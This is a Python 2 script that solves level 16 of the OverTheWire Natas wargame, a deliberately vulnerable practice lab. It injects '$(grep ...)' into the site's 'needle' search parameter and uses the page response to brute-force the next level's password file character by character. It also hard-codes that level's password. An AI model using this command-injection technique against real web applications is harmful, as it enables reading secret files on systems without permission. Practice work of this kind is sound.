#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level16.py
  Solution for natas level16
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 16
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

def bruteforce_blind_injection():

   chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
   parsedChars = ''
   existMsg = 'Output:\n<pre>\n</pre>'
   flag = ''

   for c in chars:
       r = requests.get(host + '?needle=$(grep ' + c + ' /etc/natas_webpass/natas17)shallows', auth=(user, password))
       if r.content.find(existMsg) != -1:
           parsedChars += c

   for i in range(32):
       for c in parsedChars:
           r = requests.get(host+'?needle=$(grep ^' + flag + c + ' /etc/natas_webpass/natas17)shallows', auth=(user, password))
           if r.content.find(existMsg) != -1:
              flag += c
              print 'Flag: {0}\r'.format(flag + '*' * int(32 - len(flag))),
              sys.stdout.flush()
              break

   return flag

def get_flag():
    print("")
    return bruteforce_blind_injection()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
